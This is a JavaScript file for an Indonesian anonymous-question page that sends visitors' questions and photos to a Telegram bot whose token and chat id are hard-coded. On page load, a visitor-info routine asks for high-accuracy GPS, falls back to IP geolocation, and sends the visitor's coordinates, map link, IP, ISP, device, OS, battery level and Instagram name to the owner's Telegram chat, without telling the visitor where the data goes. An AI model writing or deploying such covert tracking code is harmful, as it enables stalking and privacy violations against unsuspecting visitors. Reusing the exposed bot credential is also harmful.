const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
openPhotoOptions.addEventListener('click', () => {
  photoOptions.classList.toggle('show');
});

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

// pastikan audio bisa dimulai hanya setelah interaksi nyata
async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (err) {
    console.log("Autoplay gagal:", err);
    btnMusic.classList.add("show");
  }
}

// Deteksi platform mobile
const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);

// PC: boleh langsung trigger setelah klik/touch pertama
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

// tombol utama tetap jadi pemicu manual (aman di mobile)
btnMusic.addEventListener('click', async () => {
  try {
    await music.play();
    music.muted = false;
    started = true;
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (e) {
    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
    console.log(e);
  }
});

// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
if (isMobile) {
  btnMusic.classList.add("show");
  music.muted = true;
  // hilangkan autoplay otomatis agar tidak error
} else {
  // desktop: bisa coba autoplay kecil setelah delay
  setTimeout(() => { startMusic(); }, 800);
}

const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

const overlay = document.getElementById("blurOverlay"),
  input = document.getElementById("igInput"),
  btnLogin = document.getElementById("igSubmit"),
  savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) {
  removeOverlay();
  showUserStatus(savedIG);
}
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// universal send animation + swoosh
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(() => {});
      } catch (e) {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// send question (modal)
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const qmsg = document.getElementById('qmsg');
  if (!text) {
    qmsg.textContent = "Isi pertanyaan dulu.";
    return;
  }
  await sendTelegramMessage(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
    qmsg
  );
  setTimeout(() => { if (qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
});

// take photo / preview
const takeBtn = document.getElementById("takePhoto");
const photoInput = document.getElementById("photoInput");
takeBtn.onclick = async () => {
  try {
    const cameraInput = document.createElement("input");
    cameraInput.type = "file";
    cameraInput.accept = "image/*";
    cameraInput.capture = "user";
    cameraInput.click();
    cameraInput.onchange = () => {
      if (cameraInput.files.length > 0) {
        photoInput.files = cameraInput.files;
        const reader = new FileReader();
        reader.onload = (e) => { preview.src = e.target.result; preview.style.display = "block"; };
        reader.readAsDataURL(cameraInput.files[0]);
      }
    };
  } catch (e) { alert("Kamera tidak tersedia"); }
};
photoInput.addEventListener('change', () => {
  if (photoInput.files && photoInput.files[0]) {
    const reader = new FileReader();
    reader.onload = () => {};
    reader.readAsDataURL(photoInput.files[0]);
  }
});

// send photo
document.getElementById("sendPhoto").addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const fileInput = document.getElementById("photoInput");
  const file = fileInput.files && fileInput.files[0];
  const caption = document.getElementById("caption").value;
  const statusEl = document.getElementById("status");
  if (!file) { statusEl.textContent = "Pilih foto dulu."; return; }
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
  fd.append("photo", file);
  const ok = await sendTelegramMessage(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
    { method: "POST", body: fd },
    statusEl
  );
  if (ok) {
    fileInput.value = "";
    document.getElementById("caption").value = "";
    preview.style.display = "none";
  }
});

// === Pengambilan Info Pengunjung ===
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";

  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
    try {
      const now = new Date();
      const mapLink = (latitude && longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
        : "https://www.google.com/maps";
      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
        /Android/i.test(navigator.userAgent) ? "Android" :
        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
        /Mac/i.test(navigator.userAgent) ? "MacOS" :
        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
      let batteryInfo = "Tidak diketahui";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
      } catch {}

      const msg = `📢 Pengunjung Baru!
👤 ${savedUser}
🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
🗺️ Maps: ${mapLink}
📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
💻 ${device}
🧩 OS: ${os}
🔋 Baterai: ${batteryInfo}
🏷️ ISP: ${d.connection?.isp || d.org || "?"}
📡 IP: ${d.ip || "?"}
🕓 ${now.toLocaleString('id-ID')}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    } catch (err) { console.error("❌ Gagal kirim info:", err); }
  }

  try {
    const coords = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
    });
    const { latitude, longitude, accuracy } = coords.coords;
    const ipData = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
  } catch {
    const d = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
  }
}
showVisitorInfo();

// === Efek Butterfly & Live Mode ===
// (bagian efek dan status sama persis dengan file asli)
